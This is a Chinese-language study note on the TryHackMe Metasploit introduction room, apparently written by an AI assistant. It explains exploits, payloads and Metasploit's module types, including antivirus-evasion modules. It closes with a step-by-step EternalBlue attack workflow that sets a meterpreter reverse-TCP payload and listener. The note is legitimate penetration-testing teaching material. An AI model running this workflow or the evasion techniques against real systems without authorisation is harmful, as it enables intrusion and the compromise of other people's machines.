> [!info] LINK & TAG
> [TryHackMe | Metasploit: Introduction](https://tryhackme.com/room/metasploitintro)
> 
> #metasploit#exploitation

Metasploit 主要用途：  
**利用漏洞（exploit）、搭配 payload，進行滲透攻擊、漏洞驗證、後期滲透（post-exploitation）。**

主要工具：

```bash
msfconsole
```

---

# 🔥 1. 三大核心概念

### **1) Vulnerability（漏洞）**

程式設計、邏輯、設定上的缺陷，可能導致：

- 資料外洩
    
- 執行任意程式
    
- 系統權限提升
    

---

### **2) Exploit（利用程式）**

利用漏洞的程式碼 → 用來入侵、觸發錯誤、或產生預期行為。

---

### **3) Payload（有效載荷）**

Exploit 成功後要在目標機器執行的動作。

例如：

- 反彈 Shell（shell_reverse_tcp）
    
- 建立帳號
    
- 執行指令
    
- 開啟 calc.exe
    

---

# 🔥 2. Metasploit 模組種類（MSF 最重要架構）

Metasploit 由大量 **modules（模組）** 組成，每種模組都有不同用途：

---

## **① Auxiliary（輔助模組）**

用於非 Exploit 的行為，例如：

- Scanners（掃描）
    
- Fuzzers（模糊測試）
    
- Crawlers（爬蟲）
    
- 釣魚工具
    
- Dos 測試工具
    

📁 路徑：

```
modules/auxiliary/
```

用途：**偵查、收集、測試**（不是攻擊）。

---

## **② Encoders（編碼器）**

用途：

- 對 payload 進行編碼 → 盡量繞過簡單的 signature-based Antivirus
    
- 不是完整的 AV bypass 技術
    

📁 路徑：

```
modules/encoders/
```

代表性例子：  
x86/shikata_ga_nai

---

## **③ Evasion（AV 逃避模組）**

比 Encoders 更進階：  
**真正針對 Windows Defender / AV 進行繞過技術的模組**

📁 路徑：

```
modules/evasion/
```

例如：

- applocker bypass
    
- defender bypass
    
- syscall injection
    

---

## **④ Exploits（漏洞利用模組）**

依 OS 分類，例如：

```
exploits/windows
exploits/linux
exploits/multi
```

這是 Metasploit 的核心：

- 利用漏洞取得控制權
    
- 可搭配 payload
    

例如：

```
exploit/windows/smb/ms17_010_eternalblue
```

---

## **⑤ Payloads（有效載荷）**

路徑：

```
modules/payloads/
```

分為 4 種：

### ✔ Singles（單階段 / inline）

完全自包含 → 直接執行。

例如：

```
windows/x64/shell_reverse_tcp
```

---

### ✔ Stagers（階段 1）

目標機器先載一個小型 loader，建立連線後再下載 stage。

---

### ✔ Stages（階段 2）

Stager 成功後載下來的大型 payload，例如：

- meterpreter
    
- 大型 reverse shell
    

---

### ✔ Adapters

讓 payload 包成不同格式，例如 PowerShell。

---

⚡ **如何判讀 payload 是 single 還是 staged？**

|類型|範例|特徵|
|---|---|---|
|**Single**|`generic/shell_reverse_tcp`|`shell_reverse` → 用 **底線**|
|**Staged**|`windows/x64/shell/reverse_tcp`|`shell/reverse` → 用 **斜線**|

---

## **⑥ Nops（No Operation）**

用途：

- 填充 buffer
    
- 用於 shellcode 對齊
    

通常為：

```
0x90 （x86 CPU 的 NOP）
```

路徑：

```
modules/nops/
```

---

## **⑦ Post（後滲透模組）**

成功取得 shell 後使用的模組：

用途：

- Dump hash
    
- 取得資訊
    
- 權限提升檢查
    
- 網路橫移
    
- 收集資訊
    

路徑：

```
modules/post/
```

目標 OS：

```
post/windows
post/linux
post/multi
```

---

# 📌 Metasploit 模組總覽（記憶整理）

|類型|作用|例子|
|---|---|---|
|Auxiliary|掃描、模糊測試、爬蟲|scanner/portscan|
|Encoders|對 payload 編碼|x86/shikata_ga_nai|
|Evasion|繞過 AV、防毒|windows_defender_js_hta|
|Exploits|利用漏洞入侵|smb/ms17_010_eternalblue|
|Payloads|Exploit 後執行的東西|meterpreter_reverse_tcp|
|Nops|緩衝填充|x86/simple|
|Post|後滲透|hashdump、privesc 模組|

---

# 🎯 最值得記的 MSF 工作流程

1. **選 exploit：**
    
    ```
    use exploit/windows/smb/ms17_010_eternalblue
    ```
    
2. **設定目標：**
    
    ```
    set RHOSTS <IP>
    ```
    
3. **選 payload：**
    
    ```
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    ```
    
4. **設定 attacker listener：**
    
    ```
    set LHOST <your IP>
    ```
    
5. **開始攻擊：**
    
    ```
    exploit
    ```
    

---

如果你需要，我可以幫你產出：

✅ 總整理圖表  
✅ MSF 指令速查表（可貼在筆記本）  
✅ MSF Workflow 一頁背（讀書用）  
✅ MSF 重要口訣

你需要哪一種？